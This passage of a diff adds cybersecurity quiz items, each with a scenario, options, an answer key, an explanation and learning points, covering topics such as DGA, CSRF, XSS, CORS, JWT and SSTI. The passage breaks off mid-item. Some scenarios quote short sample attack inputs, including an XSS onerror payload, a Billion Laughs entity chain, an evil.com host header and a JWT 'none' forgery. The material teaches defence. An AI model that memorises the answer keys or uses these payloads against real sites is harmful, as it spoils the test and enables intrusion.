+          "https://www.sciencedirect.com/topics/computer-science/demilitarized-zone"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "Domain Generation Algorithm (DGA)",
+        "context": "A security analyst is investigating malware that appears to be trying to contact hundreds of different, random-looking domain names every hour (e.g., `asdf8923hja.com`, `89dfh23uhsd.net`). None of these domains exist yet. The analyst suspects the malware is trying to find its C2 server.",
+        "question": "What technique is the malware using to dynamically generate these potential C2 domains?",
+        "options": [
+          "DNS Zone Transfer",
+          "Domain Fronting",
+          "Domain Generation Algorithm (DGA)",
+          "DNS Tunneling"
+        ],
+        "correct": 2,
+        "explanation": "✓ A Domain Generation Algorithm (DGA) is a technique used in malware to periodically generate a large number of domain names that can be used as rendezvous points with their command and control servers. The attacker only needs to register one of the generated domains to activate the C2 channel. This makes it difficult for defenders to block the C2, as they cannot simply blacklist a static list of domains or IPs.\n✗ The other options are different DNS-related attack or evasion techniques.",
+        "learningPoints": [
+          "DGA is used by malware to create a resilient C2 communication channel.",
+          "It makes blacklisting C2 domains ineffective.",
+          "Detecting DGA often requires analyzing the linguistic or statistical properties of DNS queries to spot non-human patterns."
+        ],
+        "sources": [
+          "https://www.paloaltonetworks.com/cyberpedia/what-is-a-domain-generation-algorithm-dga"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "Reverse Proxy Security Benefit",
+        "context": "A company has several internal web servers. Instead of exposing them directly to the internet, they place a single server in front of them. All external clients connect to this server, which then forwards the requests to the appropriate internal server.",
+        "question": "What is a primary security benefit of using this reverse proxy architecture?",
+        "options": [
+          "It increases the internet speed for internal users.",
+          "It hides the identity and IP addresses of the backend servers from external clients.",
+          "It guarantees that all backend servers are free of vulnerabilities.",
+          "It removes the need for users to authenticate."
+        ],
+        "correct": 1,
+        "explanation": "✓ A reverse proxy acts as an intermediary, which means that external clients never communicate directly with the backend servers. This hides the architecture and private IP addresses of the internal network, reducing the attack surface. It can also provide additional security functions like SSL termination, load balancing, and web application firewall (WAF) capabilities at a single, centralized point.\n✗ A reverse proxy does not directly impact outbound user speed, fix backend vulnerabilities, or eliminate the need for authentication.",
+        "learningPoints": [
+          "A reverse proxy hides the characteristics of backend servers from the public internet.",
+          "It can centralize security functions like SSL termination and WAF.",
+          "This architecture improves security by reducing the direct attack surface of the internal network."
+        ],
+        "sources": [
+          "https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      }
+    ],
+    "secure-coding_beginner": [
+      {
+        "title": "Principle of Least Privilege",
+        "context": "A web application connects to a database to read product information for a public-facing catalog. The developer configures the application's database account with full administrative privileges, including the ability to delete tables.",
+        "question": "What security principle is being violated?",
+        "options": [
+          "Defense in Depth",
+          "Principle of Least Privilege",
+          "Security through Obscurity",
+          "Keep Security Simple"
+        ],
+        "correct": 1,
+        "explanation": "✓ The Principle of Least Privilege dictates that an entity (like an application's user account) should only have the minimum permissions necessary to perform its function. Since the application only needs to read data, it should have read-only access. Granting it administrative rights creates a huge risk; if the application is compromised, the attacker gains full control of the database.\n✗ The other principles are also important but do not directly address the issue of excessive permissions.",
+        "learningPoints": [
+          "Grant users and applications only the minimum permissions they need.",
+          "This limits the damage an attacker can do if one component is compromised.",
+          "Regularly review permissions to ensure they are still appropriate."
+        ],
+        "sources": [
+          "https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls",
+          "https://www.malcare.com/blog/owasp-principles/",
+          "https://medium.com/@kotteeswaran25/more-about-owasp-security-principles-471239c50393",
+          "https://patchstack.com/articles/what-is-owasp-top-10-security-by-design-principles/",
+          "https://owasp.org/www-community/Least_privilege"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Cross-Site Request Forgery (CSRF)",
+        "context": "A user is logged into their online banking website. They then visit a malicious website, which contains a hidden form that automatically submits a request to the banking website to transfer money to the attacker's account. The user's browser automatically includes their session cookie with the request.",
+        "question": "What is this type of attack called?",
+        "options": [
+          "Cross-Site Scripting (XSS)",
+          "SQL Injection",
+          "Cross-Site Request Forgery (CSRF)",
+          "Clickjacking"
+        ],
+        "correct": 2,
+        "explanation": "✓ Cross-Site Request Forgery (CSRF) is an attack that tricks a victim's browser into making an unwanted request to a web application where they are currently authenticated. Since the browser sends the request with the user's session cookie, the application treats it as a legitimate action performed by the user.\n✗ XSS involves injecting scripts into a website to run in other users' browsers. SQL injection targets the database. Clickjacking involves tricking a user into clicking something they didn't intend to.",
+        "learningPoints": [
+          "CSRF attacks force a user's browser to perform actions on their behalf.",
+          "These attacks work because browsers automatically include cookies with requests to a domain.",
+          "Anti-CSRF tokens are a common defense mechanism."
+        ],
+        "sources": [
+          "https://portswigger.net/web-security/csrf",
+          "https://owasp.org/www-community/attacks/csrf",
+          "https://www.cloudflare.com/learning/ddos/glossary/cross-site-request-forgery-csrf-attack/",
+          "https://developer.mozilla.org/en-US/docs/Web/Security/CSRF",
+          "https://www.synopsys.com/glossary/what-is-cross-site-request-forgery.html"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Clickjacking Attack",
+        "context": "An attacker creates a website with a button that says 'Win a Free Prize!'. They then create a transparent iframe over this button, which loads the victim's social media page. The 'Delete Account' button from the social media page is perfectly aligned over the 'Win a Free Prize!' button.",
+        "question": "What attack tricks a user into clicking something different from what they perceive?",
+        "options": [
+          "Phishing",
+          "Man-in-the-Middle",
+          "Denial of Service",
+          "Clickjacking"
+        ],
+        "correct": 3,
+        "explanation": "✓ Clickjacking, also known as a UI Redress Attack, is a technique that tricks a user into clicking on a webpage element that is invisible or disguised as another element. This can cause users to unwittingly perform actions like deleting their account, transferring money, or downloading malware.\n✗ Phishing involves tricking users into revealing sensitive information. MitM involves intercepting communications. DoS aims to make a service unavailable.",
+        "learningPoints": [
+          "Clickjacking involves tricking a user into clicking a hidden or disguised UI element.",
+          "It is often accomplished using transparent iframes and CSS.",
+          "The `X-Frame-Options` header is a key defense mechanism."
+        ],
+        "sources": [
+          "https://www.imperva.com/learn/application-security/clickjacking/",
+          "https://www.synopsys.com/glossary/what-is-clickjacking.html",
+          "https://www.fortinet.com/resources/cyberglossary/clickjacking",
+          "https://owasp.org/www-community/attacks/Clickjacking",
+          "https://www.kaspersky.com/resource-center/definitions/clickjacking"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Using Components with Known Vulnerabilities",
+        "context": "A developer is building a web application and includes a popular open-source library from 2018 to handle image uploads. A security scan later reveals that this specific version of the library has a well-documented Remote Code Execution (RCE) vulnerability that was patched in 2019.",
+        "question": "What is the security mistake made by the developer?",
+        "options": [
+          "Writing custom code instead of using a library.",
+          "Using a closed-source library.",
+          "Using a component with a known, unpatched vulnerability.",
+          "Choosing a library that is too popular."
+        ],
+        "correct": 2,
+        "explanation": "✓ One of the most common security risks is using outdated or vulnerable third-party components (e.g., libraries, frameworks). Attackers actively scan for applications that use components with known vulnerabilities. It is crucial for developers to keep their dependencies up-to-date and use tools to scan for such issues.\n✗ Using libraries is standard practice. The issue is not that the library is open-source or popular, but that it is a version with a known, critical flaw.",
+        "learningPoints": [
+          "Always keep third-party libraries and frameworks updated to their latest stable versions.",
+          "Using components with known vulnerabilities is a major security risk (OWASP Top 10).",
+          "Use Software Composition Analysis (SCA) tools to automatically scan for vulnerable dependencies."
+        ],
+        "sources": [
+          "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Importance of Session Invalidation",
+        "context": "A user logs into a web application, receiving a session cookie. After they are done, they click the 'Logout' button. The application's logout function simply redirects the user to the login page but does not invalidate their session on the server.",
+        "question": "What is the security risk of this implementation?",
+        "options": [
+          "The user will not be able to log back in.",
+          "An attacker could potentially replay the old session cookie to regain access to the user's account.",
+          "The server will run out of memory.",
+          "The logout button will appear broken to the user."
+        ],
+        "correct": 1,
+        "explanation": "✓ Proper session management requires that sessions are securely invalidated on the server-side during logout. If the session remains active, an attacker who steals the cookie (e.g., from browser history or via a separate attack) can reuse it to access the application as the logged-out user. This is a form of broken authentication.\n✗ The other options are incorrect. The user can log in again (creating a new session), and the server is unlikely to run out of memory from this alone.",
+        "learningPoints": [
+          "Logout functionality must invalidate the session on the server.",
+          "Simply removing the session cookie from the client is not sufficient.",
+          "Failure to properly invalidate sessions can lead to account takeover."
+        ],
+        "sources": [
+          "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Secure Defaults",
+        "context": "A new brand of home Wi-Fi router is shipped to customers. By default, the administrative interface has a well-known username and password ('admin'/'admin') and the Wi-Fi network is open with no password.",
+        "question": "What fundamental security principle has the manufacturer failed to implement?",
+        "options": [
+          "Defense in Depth",
+          "Establish Secure Defaults",
+          "Principle of Least Privilege",
+          "Separation of Duties"
+        ],
+        "correct": 1,
+        "explanation": "✓ The principle of 'Establish Secure Defaults' means that a system should be secure out-of-the-box. Users should not have to take extra steps to make it secure. Shipping a device with default credentials and an open network is the opposite of this principle, as it is insecure by default and relies on the user to fix it.\n✗ While other principles are important, the core issue here is that the default configuration itself is insecure.",
+        "learningPoints": [
+          "Systems should be configured to be secure by default.",
+          "Avoid using common, default passwords; require users to set a unique one on first use.",
+          "Insecure defaults are a common cause of security breaches."
+        ],
+        "sources": [
+          "https://owasp.org/www-project-proactive-controls/v3/en/c8-establish-secure-defaults",
+          "https://medium.com/@kotteeswaran25/more-about-owasp-security-principles-471239c50393"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Logic Bomb",
+        "context": "A disgruntled programmer inserts a piece of code into the company's payroll system. The code is designed to delete all payroll records if the programmer's own employee ID is ever removed from the system (i.e., if they are fired).",
+        "question": "What is this type of malicious code called?",
+        "options": [
+          "A worm",
+          "A virus",
+          "A logic bomb",
+          "A trojan"
+        ],
+        "correct": 2,
+        "explanation": "✓ A logic bomb is a piece of code intentionally inserted into a software system that will set off a malicious function when specified conditions are met. The trigger can be a specific date and time or, as in this case, a specific event like the deletion of a record. It lies dormant until the trigger condition occurs.\n✗ A virus attaches itself to other programs to replicate. A worm is self-replicating malware that spreads across networks. A trojan disguises itself as legitimate software.",
+        "learningPoints": [
+          "A logic bomb is malware that executes a payload when a specific condition is met.",
+          "The trigger can be time-based or event-based.",
+          "Insider threats are a common source of logic bombs."
+        ],
+        "sources": [
+          "https://www.beyondtrust.com/blog/entry/defining-a-logic-bomb",
+          "https://en.wikipedia.org/wiki/Logic_bomb",
+          "https://www.techtarget.com/whatis/definition/logic-bomb",
+          "https://www.geeksforgeeks.org/what-is-a-logic-bomb/",
+          "https://www.copado.com/devops-hub/blog/what-is-a-logic-bomb"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Defense in Depth",
+        "context": "A company secures its server room with a locked door, requires a separate password to log into the server, and encrypts the data on the server's hard drive. No single control is considered sufficient on its own.",
+        "question": "What security principle is illustrated by layering multiple different security controls?",
+        "options": [
+          "Defense in Depth",
+          "Security through Obscurity",
+          "Fail Securely",
+          "Least Privilege"
+        ],
+        "correct": 0,
+        "explanation": "✓ Defense in Depth is the concept of implementing multiple, layered security controls. The idea is that if one control fails, another one is there to stop or slow down an attacker. In this case, the physical control (locked door), logical access control (password), and data protection control (encryption) work together to provide stronger security than any single control alone.\n✗ The other options refer to different security concepts.",
+        "learningPoints": [
+          "Defense in Depth means using layered security controls.",
+          "It improves security by ensuring there is no single point of failure.",
+          "Controls can be physical, technical, or administrative."
+        ],
+        "sources": [
+          "https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/defense-in-depth",
+          "https://www.malcare.com/blog/owasp-principles/"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Integer Overflow",
+        "context": "A banking application stores a user's account balance in a 16-bit signed integer, which can hold a maximum value of 32,767. A user with a balance of $30,000 deposits another $3,000. The program attempts to store 33,000 in the variable, which wraps around to become -32,536.",
+        "question": "What type of programming error does this represent?",
+        "options": [
+          "SQL Injection",
+          "Buffer Overflow",
+          "Integer Overflow",
+          "Path Traversal"
+        ],
+        "correct": 2,
+        "explanation": "✓ An integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits. In this case, the positive value became too large and wrapped around to a negative number. This can lead to unexpected behavior and security vulnerabilities.\n✗ This is a data type constraint issue, not a SQL query (SQLi), memory buffer (buffer overflow), or file path (path traversal) vulnerability.",
+        "learningPoints": [
+          "An integer overflow happens when a number is too large for the data type used to store it.",
+          "It can lead to serious bugs and security flaws, especially in financial or memory allocation calculations.",
+          "Use data types that are large enough to hold all possible values."
+        ],
+        "sources": [
+          "https://owasp.org/www-community/vulnerabilities/Integer_overflow"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Security Misconfiguration",
+        "context": "A developer deploys a new web server. They forget to remove the default 'admin' account and password that came with the server software. They also leave a detailed debugging page publicly accessible.",
+        "question": "What category of vulnerability do these mistakes fall under?",
+        "options": [
+          "Injection",
+          "Broken Authentication",
+          "Security Misconfiguration",
+          "Sensitive Data Exposure"
+        ],
+        "correct": 2,
+        "explanation": "✓ Security Misconfiguration is a broad category that includes failures to implement all the necessary security controls for a system, or implementing them incorrectly. Examples include using default credentials, enabling unnecessary features, not changing default settings, and leaving debugging enabled in a production environment. These mistakes provide attackers with easy entry points.\n✗ While related to authentication, the root cause is the failure to properly configure the server, which is a broader issue.",
+        "learningPoints": [
+          "Security misconfiguration is one of the most common vulnerabilities (OWASP Top 10).",
+          "Always change default usernames and passwords.",
+          "Disable unnecessary features and ensure debugging information is not exposed to users."
+        ],
+        "sources": [
+          "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+        ],
+        "difficulty": "beginner",
+        "domain": "secure-coding"
+      }
+    ],
+    "secure-coding_intermediate": [
+      {
+        "title": "DOM-based XSS",
+        "context": "A web page contains the following JavaScript code to display a user's name from the URL: `var name = window.location.hash.substring(1); document.write('Welcome ' + name);`. An attacker crafts the URL `http://example.com/page.html#<img src=1 onerror=alert(1)>`.",
+        "question": "What type of Cross-Site Scripting (XSS) is this?",
+        "options": [
+          "Stored XSS",
+          "Reflected XSS",
+          "DOM-based XSS",
+          "Universal XSS"
+        ],
+        "correct": 2,
+        "explanation": "✓ This is DOM-based XSS. The vulnerability exists entirely on the client-side. The malicious payload is never sent to the server (the part of the URL after the '#' is not sent in the HTTP request). The client-side script reads the payload from the URL's fragment identifier and unsafely writes it into the Document Object Model (DOM), causing the script to execute.\n✗ Stored and Reflected XSS involve the server storing or reflecting the payload, respectively. In this case, the server never sees the payload.",
+        "learningPoints": [
+          "DOM-based XSS occurs when client-side scripts unsafely handle user-controllable data.",
+          "The payload is executed in the DOM without the page being reloaded or the payload being sent to the server.",
+          "Safe JavaScript handling of data (e.g., using `.textContent` instead of `.innerHTML` or `document.write`) is the key mitigation."
+        ],
+        "sources": [
+          "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Content Security Policy (CSP)",
+        "context": "To mitigate the risk of Cross-Site Scripting (XSS), a web developer wants to instruct the browser to only load and execute scripts from its own domain and from `apis.google.com`.",
+        "question": "What security mechanism, implemented via an HTTP response header, allows for this kind of control?",
+        "options": [
+          "HTTP Strict Transport Security (HSTS)",
+          "X-Frame-Options",
+          "Content Security Policy (CSP)",
+          "Cross-Origin Resource Sharing (CORS)"
+        ],
+        "correct": 2,
+        "explanation": "✓ Content Security Policy (CSP) is a security standard that allows developers to control the resources (like scripts, styles, images) that a user agent is allowed to load for a given page. By specifying a whitelist of trusted sources in the `Content-Security-Policy` HTTP header, developers can significantly reduce the risk and impact of XSS attacks.\n✗ HSTS enforces HTTPS. X-Frame-Options prevents clickjacking. CORS allows cross-origin requests.",
+        "learningPoints": [
+          "CSP is a powerful defense-in-depth mechanism against XSS.",
+          "It works by defining a whitelist of allowed content sources via an HTTP header.",
+          "A properly configured CSP can prevent browsers from executing malicious inline scripts or loading scripts from untrusted domains."
+        ],
+        "sources": [
+          "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Subresource Integrity (SRI)",
+        "context": "A developer includes a JavaScript library from a third-party Content Delivery Network (CDN) using the following HTML tag: `<script src=\"https://cdn.example.com/library.js\"></script>`. They are concerned that if the CDN is compromised, the `library.js` file could be replaced with malicious code.",
+        "question": "What security feature can be added to the `<script>` tag to ensure the browser only executes the file if it matches a specific cryptographic hash?",
+        "options": [
+          "The `async` attribute",
+          "The `integrity` attribute",
+          "The `defer` attribute",
+          "The `crossorigin` attribute"
+        ],
+        "correct": 1,
+        "explanation": "✓ Subresource Integrity (SRI) is a security feature that enables browsers to verify that resources they fetch (for example, from a CDN) are delivered without unexpected manipulation. It works by allowing you to provide a cryptographic hash that a fetched file must match. By adding an `integrity` attribute to the `<script>` or `<link>` tag, you ensure the browser will refuse to execute the resource if the hash of the downloaded file doesn't match the one you specified.\n✗ The other attributes control how and when the script is loaded and executed, but do not provide a cryptographic integrity check.",
+        "learningPoints": [
+          "SRI protects against CDN or third-party compromises by verifying file integrity.",
+          "It uses a cryptographic hash in the `integrity` attribute of a script or link tag.",
+          "If the file is modified in transit, the browser will not load it."
+        ],
+        "sources": [
+          "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Insecure File Uploads",
+        "context": "A website allows users to upload a profile picture. The application checks that the file extension is `.jpg` or `.png`, but it does not validate the file's actual content or prevent the file from being executed on the server. An attacker uploads a file named `shell.php.jpg` and is able to execute it.",
+        "question": "What is the primary vulnerability in this file upload feature?",
+        "options": [
+          "The file size limit is too large.",
+          "The server lacks antivirus software.",
+          "The application has insufficient validation, allowing potentially executable files to be uploaded and run.",
+          "The website does not resize the images after upload."
+        ],
+        "correct": 2,
+        "explanation": "✓ This is a classic insecure file upload vulnerability. Relying only on file extensions is insufficient as they can be spoofed (e.g., `shell.php.jpg`) or bypassed. Secure file upload features must validate the file type based on its content (MIME type), rename the file to something random, store it outside the web root, and prevent server-side execution of uploaded content.\n✗ While file size limits and AV scanning are good practices, the root cause of the code execution vulnerability is the failure to properly validate and handle the file's content and storage location.",
+        "learningPoints": [
+          "Never trust user-supplied filenames or extensions.",
+          "Validate file types based on content (MIME type/magic numbers), not just the extension.",
+          "Store uploaded files in a location that is not directly accessible and where execution permissions are denied."
+        ],
+        "sources": [
+          "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "CORS Misconfiguration",
+        "context": "A web application at `https://api.example.com` needs to be accessible by JavaScript running on `https://app.example.com`. To enable this, a developer sets the `Access-Control-Allow-Origin` HTTP header to the value of the request's `Origin` header, reflecting any origin back.",
+        "question": "Why is reflecting the origin header a dangerous CORS configuration?",
+        "options": [
+          "It prevents `https://app.example.com` from accessing the API.",
+          "It only allows access from the same domain, which is too restrictive.",
+          "Any malicious website can now make requests to the API from a victim's browser, and the browser will allow the malicious site to read the response.",
+          "It will cause the API to crash."
+        ],
+        "correct": 2,
+        "explanation": "✓ Cross-Origin Resource Sharing (CORS) is a mechanism to relax the same-origin policy. However, dynamically reflecting the `Origin` header in the `Access-Control-Allow-Origin` header is a critical misconfiguration. It means the application effectively trusts all origins. A malicious website can now make a cross-origin request to the API, and since the browser will receive a permissive CORS header, it will allow the malicious site's script to read the potentially sensitive data from the API response.\n✗ This configuration is too permissive, not too restrictive. The correct approach is to maintain a strict whitelist of allowed origins.",
+        "learningPoints": [
+          "CORS configurations should use a static, strict whitelist of trusted origins.",
+          "Dynamically reflecting the request's `Origin` header is insecure and allows any site to access the API.",
+          "A misconfigured CORS policy can completely undermine the same-origin policy's protections."
+        ],
+        "sources": [
+          "https://portswigger.net/web-security/cors/misconfigurations"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "JWT Security: Algorithm None",
+        "context": "A web application uses JSON Web Tokens (JWTs) for session management. An attacker captures a valid token, decodes the payload, and modifies their user ID to an administrator's ID. They then change the algorithm in the JWT header from 'HS256' to 'none' and re-encode the token. The server's JWT library accepts tokens with the 'none' algorithm.",
+        "question": "What is the outcome of this attack?",
+        "options": [
+          "The server will reject the token because the signature is invalid.",
+          "The server will accept the modified token because the 'none' algorithm bypasses signature verification.",
+          "The attack will fail because JWTs cannot be decoded.",
+          "The server will require the attacker to provide a secret key."
+        ],
+        "correct": 1,
+        "explanation": "✓ This is a well-known JWT vulnerability. The 'none' algorithm was intended for situations where the token's integrity is already verified. If a server's JWT library is misconfigured to accept this algorithm, it will skip the signature verification step entirely. This allows an attacker to forge any payload they want, set the algorithm to 'none', and the server will treat the token as valid, often leading to privilege escalation.\n✗ JWTs are Base64Url encoded and easily decoded. The vulnerability lies in the server trusting the client-specified algorithm without proper validation.",
+        "learningPoints": [
+          "JWT libraries must be configured to never accept the 'alg: none' algorithm.",
+          "Signature validation is the core security guarantee of a signed JWT; bypassing it renders the token insecure.",
+          "Always validate the claims and the integrity of a JWT on the server side."
+        ],
+        "sources": [
+          "https://www.snyk.io/learn/jwt-security/",
+          "https://blog.logrocket.com/jwt-authentication-best-practices/",
+          "https://www.curity.io/resources/learn/jwt-best-practices/",
+          "https://auth0.com/blog/jwt-json-web-token-signing-algorithms-overview/",
+          "https://aptori.com/blog/jwt-security-best-practices"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "XML DTD and Billion Laughs Attack",
+        "context": "An application accepts an XML file from a user and parses it. An attacker submits a small XML file that defines a series of nested entities, like so: `<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;...\"> ... <!ENTITY lol9 \"&lol8;&lol8;...\">]>`. When the parser tries to expand the final entity, it consumes gigabytes of memory.",
+        "question": "What is this type of Denial-of-Service attack called?",
+        "options": [
+          "XML External Entity (XXE)",
+          "ReDoS (Regular Expression DoS)",
+          "XML Bomb or Billion Laughs Attack",
+          "SQL Injection"
+        ],
+        "correct": 2,
+        "explanation": "✓ This is an XML Bomb or Billion Laughs Attack. It's a denial-of-service (DoS) attack that targets an XML parser. It works by exploiting the parser's feature of expanding entities. A small XML file with exponentially nested entities can cause the parser to consume an enormous amount of memory and CPU, crashing the application. The fix is to disable Document Type Definition (DTD) processing in the XML parser.\n✗ While related to XML parsing, XXE's primary goal is typically information disclosure or SSRF, not resource exhaustion.",
+        "learningPoints": [
+          "Parsing untrusted XML can lead to Denial of Service.",
+          "The Billion Laughs Attack uses exponential entity expansion to exhaust server resources.",
+          "Always disable DTD processing in XML parsers when handling untrusted data."
+        ],
+        "sources": [
+          "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Secrets Management",
+        "context": "A developer working on a new application needs to connect to a third-party API that requires an API key. They embed the key directly into their application's configuration file, which is then committed to a public GitHub repository.",
+        "question": "What is the most secure way to manage this API key?",
+        "options": [
+          "Encrypt the key and store it in the code.",
+          "Store the key in a separate text file next to the executable.",
+          "Use a dedicated secrets management service (like HashiCorp Vault or AWS Secrets Manager) or environment variables.",
+          "Email the key to the other developers on the team."
+        ],
+        "correct": 2,
+        "explanation": "✓ Secrets like API keys, database passwords, and private certificates should never be stored in source code or configuration files, especially if they are version controlled. The best practice is to store them externally using a secrets management tool or, for simpler applications, environment variables. This separates the secrets from the code, allowing for better access control, auditing, and rotation.\n✗ Hardcoding secrets, even if encrypted, is a bad practice because the decryption key often needs to be stored with the code. Storing it in a plain text file is also insecure.",
+        "learningPoints": [
+          "Never commit secrets to source control repositories.",
+          "Separate your code from your configuration and secrets.",
+          "Use environment variables or a dedicated secrets management system to handle sensitive credentials."
+        ],
+        "sources": [
+          "https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Improper Asset Management",
+        "context": "A company has a development server at `dev-server.example.com` that was used for a project last year. The project ended, but the server was never decommissioned. It is running an old, unpatched version of a web framework. An attacker discovers this forgotten server and exploits it to gain access to the company's network.",
+        "question": "What category of security risk does this scenario represent?",
+        "options": [
+          "Injection",
+          "Improper Asset Management",
+          "Broken Access Control",
+          "Cryptographic Failures"
+        ],
+        "correct": 1,
+        "explanation": "✓ Improper Asset Management, sometimes called 'Shadow IT', refers to the failure to properly track and manage all of an organization's hardware and software assets. Forgotten, unpatched 'ghost' servers are a common problem. Because they are not part of the regular inventory, they are not patched or monitored, making them an easy target for attackers looking for a foothold in the network.\n✗ While the eventual exploit might be an injection or access control flaw, the root cause is the organizational failure to manage its assets.",
+        "learningPoints": [
+          "Maintain a comprehensive and up-to-date inventory of all hardware and software assets.",
+          "Decommission unused systems and services promptly.",
+          "'Shadow IT' and forgotten assets create significant security blind spots."
+        ],
+        "sources": [
+          "https://owasp.org/www-project-top-ten/2021/A09_2021-Security_Logging_and_Monitoring_Failures"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "HTTP Parameter Pollution (HPP)",
+        "context": "A web application reads a user ID from a query parameter to perform an action: `http://example.com/api?user=123`. The backend framework only parses the last occurrence of a parameter if it is supplied multiple times. An attacker crafts the URL: `http://example.com/api?user=456&user=123`.",
+        "question": "What vulnerability might allow the attacker to perform an action as user 123 while a web application firewall (WAF) might only see and log the request for user 456?",
+        "options": [
+          "SQL Injection",
+          "Cross-Site Scripting (XSS)",
+          "HTTP Parameter Pollution (HPP)",
+          "Server-Side Request Forgery (SSRF)"
+        ],
+        "correct": 2,
+        "explanation": "✓ HTTP Parameter Pollution (HPP) exploits the fact that different web technologies (like a proxy vs. a backend server) may parse multiple occurrences of the same HTTP parameter in different ways. An attacker can use this ambiguity to bypass input validation rules, trigger application errors, or modify backend actions. In this case, a WAF might see `user=456` and approve the request, while the backend application sees `user=123` and performs the action for the wrong user.\n✗ This is not a SQL, XSS, or SSRF vulnerability; it is specifically about how HTTP parameters are parsed and interpreted.",
+        "learningPoints": [
+          "Different web server and application framework technologies may handle duplicate HTTP parameter names differently.",
+          "This ambiguity can be exploited to bypass security controls like WAFs.",
+          "Applications should be written to anticipate and handle duplicate parameters in a consistent and secure manner."
+        ],
+        "sources": [
+          "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
+        ],
+        "difficulty": "intermediate",
+        "domain": "secure-coding"
+      }
+    ],
+    "secure-coding_advanced": [
+      {
+        "title": "Server-Side Template Injection (SSTI)",
+        "context": "A web application uses a template engine to render a user's name on a welcome page. The code is `template.render(\"Hello, {{name}}\", {\"name\": user_input})`. An attacker provides the input `{{7*7}}`. The page renders as 'Hello, 49'.",
+        "question": "What vulnerability is demonstrated by the application evaluating the user's input as code?",
+        "options": [
+          "Cross-Site Scripting (XSS)",
+          "Server-Side Template Injection (SSTI)",
+          "SQL Injection",
+          "Insecure Deserialization"
+        ],
+        "correct": 1,
+        "explanation": "✓ Server-Side Template Injection occurs when user input is unsafely embedded into a server-side template, allowing the attacker to inject template directives that can be executed by the template engine on the server. The ability to execute simple expressions like `{{7*7}}` is a key indicator of SSTI. This can often be escalated to read sensitive files or achieve full Remote Code Execution (RCE).\n✗ XSS is executed on the client-side. SQL Injection targets the database. Deserialization involves object streams.",
+        "learningPoints": [
+          "SSTI occurs when user input is concatenated directly into a server-side template.",
+          "It can lead to information disclosure and Remote Code Execution.",
+          "The fix is to use the template engine's built-in functions to safely pass data, rather than building the template string dynamically."
+        ],
+        "sources": [
+          "https://portswigger.net/web-security/server-side-template-injection"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Web Cache Poisoning",
+        "context": "A web application sits behind a caching proxy. An attacker sends a request with an unkeyed header, like `X-Forwarded-Host: evil.com`. The application uses this header to generate URLs in its response. The cache stores this poisoned response and serves it to all subsequent users who request the same page.",
+        "question": "What is this attack, which causes the application's cache to serve a malicious response to other users, called?",
+        "options": [
+          "Cross-Site Request Forgery (CSRF)",
+          "Denial of Service (DoS)",
+          "Web Cache Poisoning",
+          "Session Fixation"
+        ],
+        "correct": 2,
+        "explanation": "✓ Web Cache Poisoning is an advanced attack where an attacker exploits the behavior of a web server and cache to serve a malicious HTTP response to other users. The attacker crafts a request that causes a harmful response, which is then saved in the cache. Every user who requests that resource from the cache will receive the attacker's malicious version. This often relies on manipulating unkeyed inputs, like non-standard HTTP headers.\n✗ This attack's goal is to serve malicious content to other users, which is distinct from CSRF, DoS, or Session Fixation.",
+        "learningPoints": [
+          "Web Cache Poisoning corrupts a shared cache with a malicious response.",
+          "It often exploits the application's handling of unkeyed inputs (like some HTTP headers).",
+          "The impact can be widespread, affecting every user who requests the poisoned content."
+        ],
+        "sources": [
+          "https://portswigger.net/web-security/web-cache-poisoning"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Second-Order SQL Injection",
